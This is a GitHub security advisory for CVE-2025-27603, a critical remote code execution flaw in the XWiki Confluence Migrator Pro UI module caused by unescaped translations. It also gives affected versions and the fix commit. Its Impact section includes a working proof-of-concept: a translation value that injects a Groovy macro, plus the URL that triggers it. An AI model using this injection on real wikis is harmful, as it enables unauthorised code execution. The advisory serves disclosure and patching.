# [C] com.xwiki.confluencepro:application-confluence-migrator-pro-ui Remote Code Execution via unescaped translations

## Summary
Severity: Critical
Advisory: GHSA-6qvp-39mm-95v8
CVE: CVE-2025-27603
CWE: CWE-95
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2025-03-07
Source: https://github.com/advisories/GHSA-6qvp-39mm-95v8
Type: github-advisory

## Affected
- Maven: `com.xwiki.confluencepro:application-confluence-migrator-pro-ui` — affected >=1.0 <1.2.0

## Details
### Impact
A user that doesn't have programming rights can execute arbitrary code when creating a page using the Migration Page template.
A possible attack vector is the following:
* Create a page and add the following content: 
```
confluencepro.job.question.advanced.input={{/html}} {{async async="true" cached="false" context="doc.reference"}}{{groovy}}println("hello from groovy!"){{/groovy}}{{/async}}
```
* Use the object editor to add an object of type `XWiki.TranslationDocumentClass` with scope `USER`.
* Access an unexisting page using the `MigrationTemplate` 
```
http://localhost:8080/xwiki/bin/edit/Page123?template=ConfluenceMigratorPro.Code.MigrationTemplate
```
It is expected that `{{/html}} {{async async="true" cached="false" context="doc.reference"}}{{groovy}}println("hello from groovy!"){{/groovy}}{{/async}}` will be present on the page, however, `hello from groovy` will be printed.
### Patches
The issue will be fixed as part of v1.2. The fix was added with commit [35cef22](https://github.com/xwikisas/application-confluence-migrator-pro/commit/36cef2271bd429773698ca3a21e47b6d51d6377d)

### Workarounds
There are no known workarounds besides upgrading.

### References
No references.

## References
- https://github.com/xwikisas/application-confluence-migrator-pro/security/advisories/GHSA-6qvp-39mm-95v8
- https://nvd.nist.gov/vuln/detail/CVE-2025-27603
- https://github.com/xwikisas/application-confluence-migrator-pro/commit/36cef2271bd429773698ca3a21e47b6d51d6377d
- https://github.com/xwikisas/application-confluence-migrator-pro
